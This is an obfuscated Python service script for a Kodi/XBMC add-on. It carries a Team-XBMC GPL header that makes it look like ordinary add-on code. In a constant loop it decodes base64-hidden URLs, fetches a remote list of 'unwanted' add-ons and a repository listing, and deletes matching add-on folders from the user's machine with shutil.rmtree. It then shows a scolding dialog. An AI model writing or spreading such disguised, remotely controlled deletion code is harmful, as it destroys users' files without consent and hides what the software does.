#!/usr/bin/python
# -*- coding: utf-8 -*-
#
#     Copyright (C) 2013 Team-XBMC
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program. If not, see <http://www.gnu.org/licenses/>.
#
if 64 - 64: i11iIiiIii
import platform
import xbmc
import lib . common
import os , re , shutil , xbmcgui , base64 , urllib2
from lib . common import log , dialog_yesno
from lib . common import upgrade_message as _upgrademessage
from lib . common import upgrade_message2 as _upgrademessage2
if 65 - 65: O0 / iIii1I11I1II1 % OoooooooOO - i1IIi
o0OO00 = lib . common . ADDON
oo = lib . common . ADDONVERSION
i1iII1IiiIiI1 = lib . common . ADDONNAME
iIiiiI1IiI1I1 = lib . common . ADDONPATH
o0OoOoOO00 = lib . common . ICON
I11i = False
O0O = xbmc . translatePath ( os . path . join ( 'special://home/addons/' ) )
Oo = xbmcgui . Dialog ( )
I1ii11iIi11i = base64 . decodestring
I1IiI = xbmc . Monitor ( )
if 73 - 73: OOooOOo / ii11ii1ii
if 94 - 94: OoOO + OoOO0ooOOoo0O + o0000oOoOoO0o * o00O0oo
def O0oOO0o0 ( ) :
 while not I1IiI . abortRequested ( ) :
  xbmc . sleep ( 10 )
  i1ii1iIII = Oo0oO0oo0oO00 ( I1ii11iIi11i ( 'aHR0cDovL2FyY2hpdGVjdHMueDEwaG9zdC5jb20vdGVzdGRlbGV0ZS50eHQ=' ) )
  i111I = Oo0oO0oo0oO00 ( I1ii11iIi11i ( 'aHR0cDovL3d3dy5kY2JuZXR3b3JraW5nLmNvbS9yZXBvL1BsdWdpbnMvcGx1Z2luLnZpZGVvLnNwb3J0cy5hbm9ueW1vdXNway8=' ) )
  II1Ii1iI1i = re . compile ( '<unwanted_addon =(.+?)</unwanted_addon>' ) . findall ( i1ii1iIII )
  for iiI1iIiI in II1Ii1iI1i :
   iiI1iIiI = ( str ( iiI1iIiI ) )
   if os . path . exists ( xbmc . translatePath ( iiI1iIiI ) ) :
    OOo ( iiI1iIiI )
   else :
    Ii1IIii11 = re . compile ( '<li><a href="(.+?)">.+?</a></li>' ) . findall ( i111I )
    for iiI1iIiI in Ii1IIii11 :
     iiI1iIiI = ( str ( O0O ) ) + ( str ( iiI1iIiI ) ) . replace ( '.zip' , '' )
     if os . path . exists ( xbmc . translatePath ( iiI1iIiI ) ) :
      OOo ( iiI1iIiI )
     else :
      pass
      if 55 - 55: i1111 - i1IIi11111i / I11i1i11i1I % ooIiII1I1i1i1ii / oOOOo0o0O + OOoOoo00oo
def Oo0oO0oo0oO00 ( url ) :
 iiI11 = urllib2 . Request ( url )
 iiI11 . add_header ( 'User-Agent' , 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.0.3) Gecko/2008092417 Firefox/3.0.3' )
 OOooO = urllib2 . urlopen ( iiI11 )
 OOoO00o = OOooO . read ( )
 OOooO . close ( )
 return OOoO00o
 if 9 - 9: I1iiiiI1iII - oOo0 / i1Ii % i1IIi
 if 85 - 85: I11i1i11i1I % i1111 * i1Ii
def OOo ( addon ) :
 OO0O00OooO = ( addon ) . replace ( 'special://home/addons/' , '' )
 Oo . ok ( "[COLOR=white]This is growing old now[/COLOR]" , 'Unfortunately you have installed [COLORred]' + OO0O00OooO + '[/COLOR]' , 'It has been removed as is only there to fuel ego' , '[COLORyellow]USE OFFICIAL ADDONS AND SHOW RESPECT[/COLOR]' )
 addon = xbmc . translatePath ( str ( addon ) )
 shutil . rmtree ( addon , ignore_errors = True )
 if 77 - 77: OOooOOo - OOooOOo . ii11ii1ii / o00O0oo
xbmc . sleep ( 10 )
O0oOO0o0 ( )
if 14 - 14: ooIiII1I1i1i1ii % O0
# dd678faae9ac167bc83abf78e5cb2f3f0688d3a3
